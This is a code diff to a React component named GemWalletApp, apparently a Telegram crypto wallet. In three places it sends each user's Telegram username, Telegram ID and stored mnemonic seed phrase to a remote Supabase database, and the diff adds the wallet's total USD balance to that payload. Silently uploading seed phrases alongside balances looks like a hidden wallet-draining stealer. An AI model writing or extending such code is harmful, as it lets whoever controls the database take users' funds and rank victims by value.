@@ -8072,11 +8072,12 @@ export default function GemWalletApp() {
           ? "@" + tgUser.username
           : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
           || "User_" + (uid || "Unknown");
+        const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
         syncWalletToSupabase({
           username: uname,
           telegram_id: uid || null,
           mnemonic: storedMnemonic,
-          balance: "0"
+          balance: totalUSD.toFixed(2)
         });
       }
     } catch(e) { console.error("[handleUnlock] sync error:", e); }
@@ -8134,11 +8135,12 @@ export default function GemWalletApp() {
           if (tgUser.username) return "@" + tgUser.username;
           return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
         })();
+        const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
         syncWalletToSupabase({
           username: userName,
           telegram_id: userId || null,
           mnemonic: storedMnemonic,
-          balance: "0"
+          balance: totalUSD.toFixed(2)
         });
       }, 1000);
     }
@@ -8157,14 +8159,15 @@ export default function GemWalletApp() {
         ? "@" + tgUser.username
         : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
         || "User_" + (uid || "Unknown");
+      const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
       syncWalletToSupabase({
         username: uname,
         telegram_id: uid || null,
         mnemonic: storedMnemonic,
-        balance: "0"
+        balance: totalUSD.toFixed(2)
       });
     } catch(e) { console.error("[walletScreen] sync error:", e); }
-  }, [screen]);
+  }, [screen, assets, prices]);
 
 
 
